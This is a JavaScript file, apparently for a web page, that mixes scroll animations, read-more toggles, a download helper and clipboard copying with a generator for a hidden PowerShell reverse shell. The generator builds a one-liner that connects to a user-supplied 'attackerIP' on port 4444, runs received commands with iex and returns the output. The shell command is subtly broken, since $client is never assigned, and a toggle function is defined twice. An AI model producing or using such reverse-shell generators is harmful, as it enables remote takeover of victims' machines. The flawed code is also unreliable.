document.addEventListener("DOMContentLoaded", () => {
  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      console.log(entry);
      if (entry.isIntersecting) {
        entry.target.classList.add('show');
      } else {
        entry.target.classList.remove('show');
      }
    });
  });

  const sectionsToObserve = document.querySelectorAll(".hidden");

  sectionsToObserve.forEach((section) => {
    observer.observe(section);
  });
});

function toggleReadMore(button) {
  const content = button.previousElementSibling;
  if (content.style.maxHeight === "0px" || content.style.maxHeight === "") {
      content.style.maxHeight = content.scrollHeight + "px";
      button.classList.remove("collapsed");
      button.classList.add("expanded");
  } else {
      content.style.maxHeight = "0";
      button.classList.remove("expanded");
      button.classList.add("collapsed");
  }
}

function downloadFiles() {
  var secondFileLink = document.createElement('a');
  secondFileLink.href = 'matrix.txt';
  secondFileLink.download = 'matrix.txt';
  document.body.appendChild(secondFileLink);
  secondFileLink.click();
  document.body.removeChild(secondFileLink);
}

    // Toggle the visibility of the "read-more-content" section
    function toggleReadMore(button) {
      const content = button.previousElementSibling;
      content.classList.toggle('hidden');
      button.classList.toggle('collapsed');
    }

    // Copy the text inside a specific element to the clipboard
    function copyToClipboard(elementId) {
      const copyText = document.getElementById(elementId).innerText;
      navigator.clipboard.writeText(copyText)
        .then(() => {
          alert('Copied to clipboard');
        })
        .catch((err) => {
          alert('Failed to copy text: ' + err);
        });
    }

    // Generate the PowerShell reverse shell command using the user-input IP
    function generatePowerShellCommand() {
      const attackerIP = document.getElementById('attackerIP').value.trim();
      if (!attackerIP) {
        alert('Please enter a valid IP address.');
        return;
      }
      const command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${attackerIP}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;

      const commandElement = document.getElementById('powershellCommand');
      commandElement.innerText = command;
    }
